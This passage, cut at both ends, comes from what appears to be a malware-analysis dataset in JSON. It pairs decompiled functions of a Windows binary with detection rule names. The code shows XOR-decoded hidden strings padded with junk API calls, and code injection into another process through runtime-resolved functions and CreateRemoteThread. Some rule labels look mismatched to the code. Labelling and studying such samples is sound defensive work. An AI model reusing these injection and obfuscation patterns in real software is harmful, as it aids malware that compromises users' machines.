iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0xdb2557) {\n            *(iVar8 + var_84h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_84h)[&var_20h - var_84h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x17);\n    fcn.0040ba72();\n    var_20h._0_1_ = 0x17;\n    var_20h._1_1_ = 0xc;\n    var_20h._2_1_ = 0x32;\n    var_20h._3_1_ = 0x46;\n    var_1ch._0_1_ = 0x15;\n    var_1ch._1_1_ = 0x53;\n    var_1ch._2_1_ = 0x30;\n    var_1ch._3_1_ = 0xc;\n    var_18h._0_1_ = 0x36;\n    var_18h._1_1_ = 0x58;\n    var_18h._2_1_ = 0x1f;\n    var_18h._3_1_ = 0x50;\n    var_14h._0_1_ = 0x25;\n    var_14h._1_1_ = 5;\n    var_14h._2_1_ = 0x21;\n    var_14h._3_1_ = 0x46;\n    var_10h._0_1_ = 0x19;\n    var_10h._1_1_ = 0x44;\n    var_10h._2_1_ = 0x2d;\n    var_ch._0_1_ = 0x14;\n    var_ch._1_1_ = 0x53;\n    var_ch._2_1_ = 0x15;\n    var_ch._3_1_ = 0x32;\n    var_8h = 0x34716944;\n    var_4h._0_2_ = 0x3270;\n    var_10h._3_1_ = var_14h._1_1_;\n    fcn.00401000(0x18);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar4 != 0x1deec1) {\n            *(iVar8 + var_c0h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_c0h)[&var_20h - var_c0h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x18);\n    fcn.0040ba72();\n    var_28h = 0x4195c0b;\n    var_24h._0_1_ = 0x41;\n    var_24h._1_1_ = 0x1c;\n    var_24h._2_2_ = 0x5c2c;\n    var_20h._0_1_ = 0x29;\n    var_20h._1_1_ = 0x35;\n    var_20h._2_1_ = 0x46;\n    var_20h._3_1_ = 10;\n    var_1ch._0_1_ = 0x3c;\n    var_1ch._1_1_ = 0x74;\n    var_1ch._2_1_ = 0x2c;\n    var_1ch._3_1_ = 0x18;\n    var_18h._0_1_ = 0x75;\n    var_18h._1_1_ = 0xc;\n    var_18h._2_1_ = 0x3b;\n    var_18h._3_1_ = 0x5c;\n    var_14h._0_1_ = 0x3e;\n    var_14h._1_1_ = 5;\n    var_14h._2_1_ = 100;\n    var_14h._3_1_ = 0x1d;\n    var_10h._0_1_ = 0x31;\n    var_10h._1_1_ = 0x4f;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 0x51;\n    var_ch._1_1_ = 8;\n    var_ch._2_1_ = 0x3d;\n    var_ch._3_1_ = 0x39;\n    var_8h = 0x764d3958;\n    var_4h._0_2_ = 0x6f34;\n    fcn.00401000(0x20);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0x2e55af) {\n            *(iVar8 + var_b8h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_b8h)[&var_28h - var_b8h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x20);\n    fcn.0040ba72();\n    var_1ch._0_1_ = 0x15;\n    var_1ch._1_1_ = 0x5d;\n    var_1ch._2_1_ = 7;\n    var_1ch._3_1_ = 0x3f;\n    var_18h._0_1_ = 0x39;\n    var_18h._1_1_ = 0x27;\n    var_18h._2_1_ = 0x5a;\n    var_18h._3_1_ = 0x30;\n    var_14h._0_1_ = 0x36;\n    var_14h._1_1_ = 5;\n    var_14h._2_1_ = 0x34;\n    var_14h._3_1_ = 0x51;\n    var_10h._0_1_ = 0x23;\n    var_10h._1_1_ = 0x33;\n    var_10h._2_1_ = 0x39;\n    var_10h._3_1_ = 0x23;\n    var_ch._0_1_ = 0x5f;\n    var_ch._1_1_ = 0x30;\n    var_ch._2_1_ = 0x5a;\n    var_8h = 0x5a553846;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x55);\n    fcn.00401000(0x13);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar4 != 0x2e7fb3) {\n            *(iVar8 + var_b0h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_b0h)[&var_1ch - var_b0h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x13);\n    fcn.0040ba72();\n    var_28h = 0x247c2909;\n    var_24h._0_1_ = 0x2b;\n    var_24h._1_1_ = 0x20;\n    var_24h._2_2_ = 0x2d3f;\n    var_20h._0_1_ = 0x46;\n    var_20h._1_1_ = 0x2f;\n    var_20h._2_1_ = 0x1f;\n    var_20h._3_1_ = 0x3d;\n    var_1ch._0_1_ = 0x28;\n    var_1ch._1_1_ = 0x27;\n    var_1ch._2_1_ = 0x5c;\n    var_1ch._3_1_ = 0x24;\n    var_18h._0_1_ = 0x2f;\n    var_18h._1_1_ = 1;\n    var_18h._2_1_ = 0x3f;\n    var_18h._3_1_ = 0x38;\n    var_14h._0_1_ = 0x65;\n    var_14h._1_1_ = 0x38;\n    var_14h._2_1_ = 0x21;\n    var_14h._3_1_ = 0x24;\n    var_10h._0_1_ = 0x33;\n    var_10h._1_1_ = 0x20;\n    var_10h._2_1_ = 0x50;\n    var_10h._3_1_ = 0x2d;\n    var_ch._0_1_ = 0x2d;\n    var_ch._1_1_ = 0x52;\n    var_8h = 0x4a354c5a;\n    var_4h._0_2_ = 0x5248;\n    fcn.00401000(0x1e);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar4 != 0x4fd519) {\n            *(iVar8 + var_9ch) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_9ch)[&var_28h - var_9ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1e);\n    fcn.0040ba72();\n    var_1ch._0_1_ = 99;\n    var_1ch._1_1_ = 0x1d;\n    var_1ch._2_1_ = 0x3e;\n    var_1ch._3_1_ = 0x2a;\n    var_18h._0_1_ = 6;\n    var_18h._1_1_ = 0x54;\n    var_18h._2_1_ = 0x6a;\n    var_18h._3_1_ = 0x17;\n    var_14h._0_1_ = 4;\n    var_14h._1_1_ = 0x26;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 0x43;\n    var_10h._0_1_ = 0x59;\n    var_10h._1_1_ = 0xe;\n    var_10h._2_1_ = 3;\n    var_10h._3_1_ = 0x2f;\n    var_ch._0_1_ = 0xe;\n    var_ch._1_1_ = 0x56;\n    var_ch._2_1_ = 0x55;\n    var_ch._3_1_ = 0x78;\n    var_8h = 0x436a7830;\n    var_4h._0_2_ = 0x316b;\n    fcn.00401000(0x14);\n    iVar8 = var_30h;\n    iVar7 = 0;\n    iVar4 = &var_1ch - var_30h;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar5 != 0x5e6562) {\n            *(iVar7 + iVar8) = *(&var_8h + iVar7 % var_34h) ^ (iVar7 + iVar8)[iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x14);\n    fcn.0040ba72();\n    var_28h = 0x3b02510a;\n    var_24h._0_1_ = 10;\n    var_24h._1_1_ = 0x24;\n    var_24h._2_2_ = 0x512d;\n    var_20h._0_1_ = 0x12;\n    var_20h._1_1_ = 0x30;\n    var_20h._2_1_ = 2;\n    var_20h._3_1_ = 0x27;\n    var_1ch._0_1_ = 0x36;\n    var_1ch._1_1_ = 0x58;\n    var_1ch._2_1_ = 0x28;\n    var_1ch._3_1_ = 0x2a;\n    var_18h._0_1_ = 0x23;\n    var_18h._1_1_ = 0x2c;\n    var_18h._2_1_ = 0x37;\n    var_18h._3_1_ = 0x5f;\n    var_14h._0_1_ = 0x11;\n    var_14h._1_1_ = 0x3b;\n    var_14h._2_1_ = 6;\n    var_14h._3_1_ = 0x33;\n    var_10h._0_1_ = 0x30;\n    var_10h._1_1_ = 0x58;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 10;\n    var_ch._1_1_ = 0x45;\n    var_3ch = 0x49413459;\n    var_38h._0_2_ = 0x456f;\n    fcn.00401000(0x1e);\n    iVar8 = var_8h;\n    iVar7 = 0;\n    iVar4 = &var_28h - var_8h;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar5 != 0x1f6e33) {\n            puVar1 = iVar7 + iVar8;\n            *puVar1 = *(&var_3ch + iVar7 % var_34h) ^ puVar1[iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1e);\n    fcn.0040ba72();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*pcVar3)(0, var_30h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_9ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_b0h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_b8h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_c0h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_84h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_4ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_a4h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_54h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_8ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_5ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_b4h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_64h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_94h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_6ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_ach);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_74h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_40h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_7ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_bch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_44h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_48h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_50h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_58h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_60h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_68h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_70h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_78h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_80h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_88h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_90h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_98h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_a0h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_a8h);\n    (*pcVar2)(uVar6);\n    return;\n}\n",
        "token_count": 20006
    },
    "00407d0f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407d0f(int32_t *arg_8h, int32_t lpStartAddress, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint *puVar3;\n    uint32_t arg_8h_00;\n    char cVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int16_t *piVar8;\n    int32_t unaff_EBX;\n    uint unaff_ESI;\n    int16_t *piVar9;\n    int32_t *piVar10;\n    int32_t iVar11;\n    int64_t iVar12;\n    uint *puVar13;\n    uint uVar14;\n    uint uVar15;\n    int16_t *piVar16;\n    uint *puStack124;\n    uint *puStack120;\n    int32_t iStack116;\n    int32_t iStack112;\n    int16_t *piStack108;\n    int32_t *piStack104;\n    uint8_t *puStack100;\n    uint32_t uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint8_t auStack76 [4];\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t uStack60;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    int16_t *piStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    cVar4 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    puStack120 = NULL;\n    piVar10 = arg_8h + 1;\n    piStack104 = piVar10;\n    if (*piVar10 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*piVar10);\n        *piVar10 = 0;\n    }\n    iVar12 = CONCAT44(puStack100, uStack96);\n    puStack124 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41cd38 & 1) != 0)) {\n        iStack116 = 5;\n        if (cVar4 != '\\x05') {\n            if ((*0x41cdf8 | *0x41cdfc) == 0) {\n                iStack72 = 0x1b280202;\n                uStack68 = 0x2012421e;\n                uStack64 = CONCAT22(uStack64._2_2_, 0x721b);\n                uStack80 = 0x774c766c;\n                auStack76[0] = 0x72;\n                fcn.00401000(10);\n                iVar11 = 0;\n                uStack92 = auStack76 + -puStack100;\n                do {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar5 != 0x50efc5) {\n                        puStack100[iVar11] = *(&uStack84 + iVar11 % 5) ^ (puStack100 + iVar11)[uStack92];\n                    }\n                    iVar11 = iVar11 + 1;\n                } while (iVar11 < 10);\n                piStack36 = 0x340e3b13;\n                iStack32 = 0x3b20163b;\n                uStack28 = 0x163a2207;\n                uStack24 = 0x50a1b33;\n                uStack20 = 0x4f25122c;\n                uStack84 = 0x77624f41;\n                uStack80 = CONCAT22(uStack80._2_2_, 0x7349);\n                fcn.00401000(0x14);\n                arg_8h_00 = uStack96;\n                iVar11 = 0;\n                iVar5 = 6;\n                uStack96 = &uStack40 - uStack96;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                    if (iVar6 != 0xca005) {\n                        *(iVar11 + arg_8h_00) = *(&uStack88 + iVar11 % iVar5) ^ (iVar11 + arg_8h_00)[uStack96];\n                    }\n                    iVar11 = iVar11 + 1;\n                } while (iVar11 < 0x14);\n                fcn.0040a64b();\n                piVar10 = piStack104;\n                *0x41cdf8 = fcn.0040ab39(arg_8h_00);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h_00);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                uVar15 = (*pcVar2)(0, piVar10);\n                (*pcVar7)(uVar15);\n                if (*0x41cdf8 != 0) goto code_r0x004082c3;\n            }\n            else {\ncode_r0x004082c3:\n                *0x41cdfc = *0x41cdf8 >> 0x20;\n                uVar15 = 0;\n                iVar11 = fcn.0040ef30(*0x41cdf8, *0x41cdfc, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n                if (-1 < iVar11) goto code_r0x00408308;\n            }\n            uVar15 = 0xffffffff;\n            goto code_r0x00408308;\n        }\n        if ((*0x41ce00 | *0x41ce04) == 0) {\n            fcn.0040a64b();\n            piVar16 = 0xa;\n            iStack72 = 0x1b280202;\n            uStack68 = 0x2012421e;\n            uStack64 = CONCAT22(uStack64._2_2_, 0x721b);\n            uStack88 = 0x774c766c;\n            uStack84 = CONCAT31(uStack84._1_3_, 0x72);\n            fcn.00401000(10);\n            iVar11 = 0;\n            puStack100 = auStack76 + -iStack112;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar5 != 0x50efc5) {\n                    *(iVar11 + iStack112) = *(&uStack92 + iVar11 % 5) ^ (iVar11 + iStack112)[puStack100];\n                }\n                iVar11 = iVar11 + 1;\n            } while (iVar11 < 10);\n            uVar15 = 0xb;\n            uStack60 = 0x27032c3b;\n            uStack56 = 0x352c1600;\n            uStack52 = uStack52 & 0xff000000 | 0x770307;\n            uStack92 = 0x6b714877;\n            uStack88 = CONCAT31(uStack88._1_3_, 0x6f);\n            fcn.00401000(0xb);\n            puVar13 = puStack120;\n            piStack104 = &uStack64 - puStack120;\n            iVar11 = 0;\n            do {\n                iVar6 = (*_sym.imp.USER32.dll_GetFocus)();\n                iVar5 = iStack116;\n                if (iVar6 != 0x21a996) {\n                    *(iVar11 + puVar13) = *(&uStack96 + iVar11 % puStack124) ^ (iVar11 + puVar13)[piStack104];\n                }\n                iVar11 = iVar11 + 1;\n            } while (iVar11 < 0xb);\n            iVar12 = fcn.0040ab39(puVar13);\n            if (iVar12 == 0) {\n                uVar15 = 0xffffffff;\n            }\n            else {\n                uVar14 = 0x2c;\n                uStack64 = 0x3855722d;\n                uStack60 = 0x301c4622;\n                uStack56 = 0x722a505d;\n                uStack52 = 0x46313852;\n                uStack48 = 0x505d3001;\n                uStack44 = CONCAT22(uStack44._2_2_, 0x7246);\n                uStack88 = 0x38307246;\n                uStack84 = CONCAT31(uStack84._1_3_, 0x50);\n                fcn.00401000(0x2c);\n                piVar9 = piStack108;\n                puStack100 = iVar12 >> 0x20;\n                uStack96 = iVar12;\n                iVar5 = 0;\n                iVar11 = &uStack68 - piStack108;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                    puVar13 = puStack124;\n                    puStack100 = iVar12 >> 0x20;\n                    uStack96 = iVar12;\n                    if (iVar6 != 0x52c3ba) {\n                        *(iVar5 + piVar9) = *(&uStack92 + iVar5 % unaff_EBX) ^ (iVar5 + piVar9)[iVar11];\n                    }\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < 0x16);\n                iStack32 = piVar9 >> 0x1f;\n                piStack36 = piVar9;\n                piVar8 = piVar9;\n                do {\n                    iVar1 = *piVar8;\n                    piVar8 = piVar8 + 1;\n                } while (iVar1 != unaff_ESI);\n                iVar1 = (piVar8 - (piVar9 + 1) >> 1) * 2;\n                uStack40 = 0;\n                uStack44 = CONCAT22(iVar1 + 2, iVar1);\n                iVar11 = fcn.0040ef30(puStack100, piStack104, 4, 0, 0, 0, 0, 0, &uStack44, &uStack44 >> 0x1f, &uStack84\n                                      , &uStack84 >> 0x1f, uVar14, uVar15);\n                puStack100 = iVar12 >> 0x20;\n                uStack96 = iVar12;\n                if (iVar11 < 0) {\n                    uVar15 = (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(iVar11);\n                    puStack100 = iVar12 >> 0x20;\n                    uStack96 = iVar12;\n                }\n                else {\n                    uStack68 = 0x2372c13;\n                    uStack64 = 0x281a3d27;\n                    uStack60 = uStack60 & 0xff000000 | 0x420936;\n                    uStack92 = 0x6c454978;\n                    uStack88 = CONCAT22(uStack88._2_2_, 0x5142);\n                    fcn.00401000(0xb);\n                    iVar11 = iStack116;\n                    puStack100 = iVar12 >> 0x20;\n                    uStack96 = iVar12;\n                    iVar5 = 0;\n                    piStack104 = &iStack72 - iStack116;\n                    piVar9 = piVar16;\n                    do {\n                        iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                        puStack100 = iVar12 >> 0x20;\n                        uStack96 = iVar12;\n                        if (iVar6 != 0x24221d) {\n                            *(iVar5 + iVar11) = *(&uStack96 + iVar5 % 6) ^ *(piStack104 + iVar5 + iVar11);\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0xb);\n                    puVar13 = 0x13;\n                    iStack72 = 0x3224100e;\n                    uStack68 = 0x71f2932;\n                    uStack64 = 0x29323c2c;\n                    uStack60 = 0x36330a19;\n                    uStack56 = uStack56 & 0xff000000 | 0x4d2827;\n                    uStack96 = 0x5341624d;\n                    uStack92 = CONCAT22(uStack92._2_2_, 0x4c46);\n                    fcn.00401000(0x13);\n                    iVar11 = 0;\n                    do {\n                        iVar5 = (*_sym.imp.USER32.dll_CreateMenu)();\n                        puVar3 = puStack120;\n                        if (iVar5 != 0xc1a44a) {\n                            *(iVar11 + piStack108) =\n                                 *(&puStack100 + iVar11 % piVar9) ^ (iVar11 + piStack108)[auStack76 + -piStack108];\n                        }\n                        iVar11 = iVar11 + 1;\n                    } while (iVar11 < 0x13);\n                    *0x41ce00 = fcn.0040ab39(piStack108);\n                    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piStack108);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                    uVar15 = (*pcVar2)(0, puVar3);\n                    (*pcVar7)(uVar15);\n                    iVar12 = CONCAT44(puStack100, uStack96);\n                    uVar15 = 0xffffffff;\n                }\n                uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar9);\n                puStack100 = iVar12 >> 0x20;\n                uStack96 = iVar12;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                puStack100 = iVar12 >> 0x20;\n                uStack96 = iVar12;\n                iVar5 = iStack116;\n            }\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar13);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            puStack100 = iVar12 >> 0x20;\n            uStack96 = iVar12;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n            puStack100 = iVar12 >> 0x20;\n            uStack96 = iVar12;\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            puStack100 = iVar12 >> 0x20;\n            uStack96 = iVar12;\n            (*pcVar7)(uVar14);\n            puStack100 = iVar12 >> 0x20;\n            uStack96 = iVar12;\n            piVar10 = piStack104;\n            if (*0x41ce00 == 0) goto code_r0x00408308;\n        }\n        else {\n            uVar15 = 0xffffffff;\n        }\n        *0x41ce04 = *0x41ce00 >> 0x20;\n        iVar11 = fcn.0040ef30(*0x41ce00, *0x41ce04, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, lpStartAddress, \n                              lpStartAddress >> 0x1f, lpParameter, lpParameter >> 0x1f);\n        puStack100 = iVar12 >> 0x20;\n        uStack96 = iVar12;\n        *piVar10 = iVar11;\n        if (iVar11 == 0) goto code_r0x00408308;\n    }\n    else {\n        if (cVar4 != '\\x05') {\n            uStack56 = 0x1b280202;\n            uStack52 = 0x2012421e;\n            uStack48 = CONCAT22(uStack48._2_2_, 0x721b);\n            uStack80 = 0x774c766c;\n            auStack76[0] = 0x72;\n            fcn.00401000(10);\n            iVar11 = 0;\n            uStack92 = &uStack60 - puStack100;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar5 != 0x50efc5) {\n                    puStack100[iVar11] = *(&uStack84 + iVar11 % 5) ^ (puStack100 + iVar11)[uStack92];\n                }\n                iVar11 = iVar11 + 1;\n            } while (iVar11 < 10);\n            piStack36 = 0x340e3b13;\n            iStack32 = 0x3b20163b;\n            uStack28 = 0x163a2207;\n            uStack24 = 0x50a1b33;\n            uStack20 = 0x4f25122c;\n            uStack84 = 0x77624f41;\n            uStack80 = CONCAT22(uStack80._2_2_, 0x7349);\n            fcn.00401000(0x14);\n            iVar11 = 0;\n            iVar5 = 6;\n            do {\n                iVar6 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                piVar10 = piStack104;\n                if (iVar6 != 0xca005) {\n                    *(iVar11 + uStack96) = *(&uStack88 + iVar11 % iVar5) ^ (iVar11 + uStack96)[&uStack40 - uStack96];\n                }\n                iVar11 = iVar11 + 1;\n            } while (iVar11 < 0x14);\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(piStack104, uStack96);\n            pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar15);\n            puVar13 = puStack124;\n            if (pcVar7 != NULL) {\n                iVar11 = (*pcVar7)(*arg_8h, 0, 0, 0, 0, 0, lpStartAddress, lpParameter, puStack124, &uStack92);\n                if (iVar11 < 0) {\n                    (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(iVar11);\n                }\n                else {\n                    piStack108 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar13, 30000);\n                    if (piStack108 == NULL) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar13, &piStack108);\n                    }\n                }\n            }\n            pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uStack96);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)();\n            uVar14 = (*pcVar2)(0, piVar10);\n            (*pcVar7)(uVar14);\n            goto code_r0x00408308;\n        }\n        iVar11 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, lpStartAddress, lpParameter, 0, arg_8h + 3);\n        *piVar10 = iVar11;\n        if (iVar11 == 0) {\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x00408308;\n        }\n        puStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar11, 30000);\n        if (puStack124 == NULL) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piVar10, &puStack124);\n        }\n    }\n    uVar15 = 0;\ncode_r0x00408308:\n    *0x41cdfc = *0x41cdf8 >> 0x20;\n    *0x41ce04 = *0x41ce00 >> 0x20;\n    return uVar15;\n}\n",
        "token_count": 4532
    },
    "0040c716": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __fastcall fcn.0040c716(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    int32_t iVar2;\n    uint unaff_EDI;\n    ushort *puVar3;\n    uint *puVar4;\n    ushort *puVar5;\n    uint16_t uVar6;\n    ushort uStack128;\n    ushort uStack126;\n    uint uStack124;\n    ushort uStack120;\n    ushort uStack118;\n    ushort uStack116;\n    ushort uStack114;\n    uint uStack112;\n    uint32_t uStack108;\n    uint uStack104;\n    uint32_t uStack100;\n    uint uStack96;\n    uint uStack92;\n    ushort *puStack88;\n    uint32_t uStack84;\n    ushort uStack74;\n    uint uStack72;\n    uint uStack68;\n    uint uStack60;\n    ushort uStack56;\n    \n    uVar6 = unaff_EDI >> 0x10;\n    puVar5 = &uStack116;\n    uStack128 = unaff_EBX;\n    uStack126 = unaff_EBX >> 0x10;\n    uStack120 = 0;\n    uStack118 = 0;\n    iVar1 = (**(*param_1 + 0xc))(param_1, &uStack120, puVar5);\n    if (-1 < iVar1) {\n        uStack124 = 0;\n        uStack120 = 0;\n        uStack118 = 0;\n        (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)();\n        iVar2 = CONCAT22(uStack126, uStack128) + 3000000000;\n        uStack124 = uStack124 + (0x4d2fa1ff < CONCAT22(uStack126, uStack128));\n        puVar3 = &uStack128;\n        for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        puVar4 = &uStack104;\n        for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        uStack128 = iVar2;\n        uStack126 = iVar2 >> 0x10;\n        (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(&uStack128, &uStack104);\n        uStack128 = 0;\n        uStack96 = uStack112;\n        uStack92 = uStack108;\n        puStack88 = uStack104;\n        uStack84 = uStack100;\n        uStack126 = 0;\n        uStack124 = 0;\n        uStack120 = 0;\n        uStack118 = 0;\n        uStack116 = 0;\n        uStack114 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_SystemTimeToTzSpecificLocalTime)(0, &uStack96, &uStack128);\n        if (-1 < iVar1) {\n            sub.ntdll.dll_memset(&uStack92 + 2, 0, 0x2e);\n            uStack72 = 0x5a0;\n            uStack92 = uStack92 & 0xffff0000 | 0x30;\n            uStack84 = uStack84 & 0xffff0000 | uVar6;\n            uStack74 = 0;\n            uStack60 = 1;\n            uStack56 = 1;\n            uStack68 = 1;\n            puStack88 = puVar5;\n            iVar2 = (**(uStack124 + 0xc))(&uStack124, &uStack92);\n            iVar1 = 0;\n            